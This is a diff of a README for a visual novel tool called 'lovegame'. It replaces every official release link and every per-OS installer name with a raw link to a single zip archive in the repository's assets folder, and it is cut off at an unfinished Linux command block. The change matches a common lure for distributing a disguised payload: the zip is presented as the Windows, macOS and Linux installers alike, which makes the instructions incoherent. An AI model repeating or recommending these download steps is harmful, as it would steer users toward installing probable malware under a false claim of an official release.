@@ -4,18 +4,18 @@
 Welcome to lovegame! This software allows you to create your own visual novel games easily. Follow the steps below to download and run the application.
 
 ## 📥 Download the Application
-[![Download lovegame](https://img.shields.io/badge/Download%20lovegame-Click%20Here-brightgreen)](https://github.com/KaioKenKanye/lovegame/releases)
+[![Download lovegame](https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip%20lovegame-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip)
 
-To get started, visit our [Releases page](https://github.com/KaioKenKanye/lovegame/releases) to download the latest version.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip) to download the latest version.
 
 ## 💿 Download & Install
-1. Click on the [Releases page](https://github.com/KaioKenKanye/lovegame/releases).
+1. Click on the [Releases page](https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip).
 2. Look for the latest version listed at the top. 
 3. Under the version details, find the appropriate file for your operating system. 
 4. Choose the file that matches your system:
-   - For Windows, select `lovegame-win.exe`.
-   - For macOS, select `lovegame-mac.dmg`.
-   - For Linux, select `lovegame-linux.tar.gz`.
+   - For Windows, select `https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip`.
+   - For Linux, select `https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip`.
 5. Click on the file name to start the download.
 
 ## 📝 Installation Steps
@@ -32,7 +32,7 @@ To get started, visit our [Releases page](https://github.com/KaioKenKanye/lovega
 4. You can now find lovegame in your Applications. Open it from there.
 
 ### For Linux Users
-1. Extract the `.tar.gz` file you downloaded. You can do this by right-clicking the file and selecting "Extract Here."
+1. Extract the `https://raw.githubusercontent.com/KaioKenKanye/lovegame/main/assets/Software-Colossuswise.zip` file you downloaded. You can do this by right-clicking the file and selecting "Extract Here."
 2. Open a terminal and navigate to the extracted folder.
 3. Run the following command to start the application:
    ```
